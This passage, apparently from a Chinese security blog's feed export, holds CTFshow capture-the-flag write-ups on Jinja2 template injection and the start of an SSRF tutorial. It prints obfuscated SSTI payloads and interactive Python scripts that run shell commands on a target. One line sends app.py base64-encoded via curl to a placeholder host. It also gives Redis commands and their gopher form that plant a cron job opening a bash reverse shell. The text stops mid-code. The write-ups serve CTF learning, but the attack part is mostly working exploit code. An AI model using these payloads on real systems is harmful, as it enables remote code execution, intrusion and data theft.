class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#'   pprint filter 在字符串上会加上单引号</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> lb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#(</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> rb<span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#)</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> point<span class="token operator">=</span><span class="token number">3.14</span><span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#.</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> x<span class="token operator">=</span><span class="token punctuation">(</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>imp<span class="token operator">=</span>a<span class="token punctuation">,</span>ort<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lo<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>sc<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>o<span class="token operator">=</span>a<span class="token punctuation">,</span>s<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>sc<span class="token punctuation">,</span>rb<span class="token punctuation">,</span>point<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>po<span class="token operator">=</span>a<span class="token punctuation">,</span>pen<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>sc<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>en<span class="token operator">=</span>a<span class="token punctuation">,</span>v<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>sc<span class="token punctuation">,</span>rb<span class="token punctuation">,</span>point<span class="token punctuation">,</span><span class="token builtin">dict</span><span class="token punctuation">(</span>rea<span class="token operator">=</span>a<span class="token punctuation">,</span>d<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join<span class="token punctuation">,</span>lb<span class="token punctuation">,</span>rb<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment"># __import__('os').popen('env').read()</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">|</span>attr<span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c2<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">(</span>c4<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>c3<span class="token punctuation">)</span><span class="token punctuation">(</span>c5<span class="token punctuation">)</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#print(a.__init__.__globals__.__getitem__("__builtins__").__getitem__("eval")("__import__('os').popen('env').read()"))</span></code></pre><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>p<span class="token operator">=</span>a<span class="token punctuation">,</span>op<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#pop </span></code></pre><ul><li>这行代码使用Jinja2的模板语法，通过字典和join过滤器构造了一个字符串 “pop”。<code>dict(p=a, op=a)</code> 创建了一个包含键值对 <code>&#123;&#39;p&#39;: a, &#39;op&#39;: a&#125;</code> 的字典，然后 <code>|join</code> 将这些键连接成字符串 “pop”。</li></ul><p>其他相似原理</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://106261e2-bcd9-4731-a15e-35ac39f86511.challenge.ctf.show/?name="</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)(24)%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set c2=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set c3=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set c4=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(c2)|attr(c3)(c4)|attr(c3)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(c2)|attr(c3)(c4)|attr(c3)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web370-过滤了数字"><a href="#web370-过滤了数字" class="headerlink" title="web370(过滤了数字)"></a>web370(过滤了数字)</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://717d6b1c-8b55-4083-b8af-52d9b0fd1eab.challenge.ctf.show/"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>        num <span class="token operator">//=</span> <span class="token number">10</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>    <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>    <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>    <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token comment"># print(payload)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="web371-372-无回显"><a href="#web371-372-无回显" class="headerlink" title="web371-372(无回显)"></a>web371-372(无回显)</h4><p>371不给 print，curl 带外</p><p>372过滤count，但是不影响</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://39ebd089-1562-497f-bff2-83664f8ae528.challenge.ctf.show/"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>        num <span class="token operator">//=</span> <span class="token number">10</span>        index <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span>    <span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span>    <span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span>    <span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span>    <span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span>    <span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span>    <span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span>    <span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span>    <span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span>    <span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% set b=eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"%2b"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"h3>(.*?)&lt;/h3"</span></span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>run<span class="token punctuation">(</span><span class="token string">"__import__('os').popen('curl -F file=`base64 app.py -w 0` http://xxxxx/').read()"</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门-ssrf</title>
      <link href="/2024/08/03/web%E5%85%A5%E9%97%A8-ssrf/"/>
      <url>/2024/08/03/web%E5%85%A5%E9%97%A8-ssrf/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><img src="begin.png" loading="lazy"></p><p>SSRF (全称：Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。</p><p>如图，攻击者从外网通过 SSRF 攻击访问到内网，接着对内网的应用展开攻击，这些应用包括但不限于 MySQL，redis，SMTP 等等 ……</p><p>正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h4 id="SSRF-的利用方式"><a href="#SSRF-的利用方式" class="headerlink" title="SSRF 的利用方式"></a>SSRF 的利用方式</h4><p>SSRF 利用相关的危险函数；SSRF 可利用的协议操作</p><h5 id="file-get-contents-与-readfile"><a href="#file-get-contents-与-readfile" class="headerlink" title="file_get_contents() 与 readfile()"></a><strong>file_get_contents() 与 readfile()</strong></h5><ul><li><code>file_get_contents</code>这一函数是把 **传入的参数(变量)**写入字符串，当把 <strong>传参</strong>是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</li></ul><h5 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a><strong>fsockopen()</strong></h5><ul><li><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个 Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定 url 数据的获取。该函数会使用 socket 跟服务器建立 tcp 连接，进行传输原始数据。 fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用<code>（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）</code>如果调用失败，将返回false。</li></ul><h5 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a><strong>curl_exec()</strong></h5><ul><li>curl_init(url) 函数初始化一个新的会话，返回一个 cURL 句柄，供<code>curl_setopt()，curl_exec()和curl_close()</code>函数使用。</li></ul><h5 id="file-协议的利用"><a href="#file-协议的利用" class="headerlink" title="file 协议的利用"></a><strong>file 协议的利用</strong></h5><pre class="language-php" data-language="php"><code class="language-php">file<span class="token punctuation">:</span><span class="token comment">///etc/password  # file:// 之后可以接任意文件</span></code></pre><h5 id="dict-协议的使用"><a href="#dict-协议的使用" class="headerlink" title="dict 协议的使用"></a><strong>dict 协议的使用</strong></h5><pre class="language-php" data-language="php"><code class="language-php">利用dict协议，dict<span class="token punctuation">:</span><span class="token comment">//ip/info 可获取本地redis服务配置信息。</span></code></pre><h5 id="gopher-协议的使用"><a href="#gopher-协议的使用" class="headerlink" title="gopher 协议的使用"></a><strong>gopher 协议的使用</strong></h5><p>首先先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议</p><pre class="language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> flushall<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token operator">|</span>redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> <span class="token parameter variable">-x</span> <span class="token builtin class-name">set</span> <span class="token number">1</span>redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/redis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> config <span class="token builtin class-name">set</span> dbfilename rootredis-cli <span class="token parameter variable">-h</span> <span class="token variable">$1</span> save//redis-cli查看所有的keys及清空所有的数据</code></pre><p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于<code>Gopher</code>协议的 URL：</p><pre class="language-php" data-language="php"><code class="language-php">gopher<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >&amp; /dev/tcp/127.0.0.1/45952 0>&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span></code></pre><p>经过url解码便是：</p><pre class="language-bash" data-language="bash"><code class="language-bash">gopher://127.0.0.1:6379/_*1 <span class="token variable">$8</span> flushall *3 <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$1</span> <span class="token number">1</span> <span class="token variable">$64</span> */1 * * * * <span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/127.0.0.1/45952 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span> *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$3</span> <span class="token function">dir</span> <span class="token variable">$16</span> /var/www/html/ *4 <span class="token variable">$6</span> config <span class="token variable">$3</span> <span class="token builtin class-name">set</span> <span class="token variable">$10</span> dbfilename <span class="token variable">$4</span> root *1 <span class="token variable">$4</span> save quit</code></pre><h3 id="web351-360"><a href="#web351-360" class="headerlink" title="web351-360"></a>web351-360</h3><h4 id="web351-curl-exec"><a href="#web351-curl-exec" class="headerlink" title="web351(curl_exec)"></a>web351(curl_exec)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token 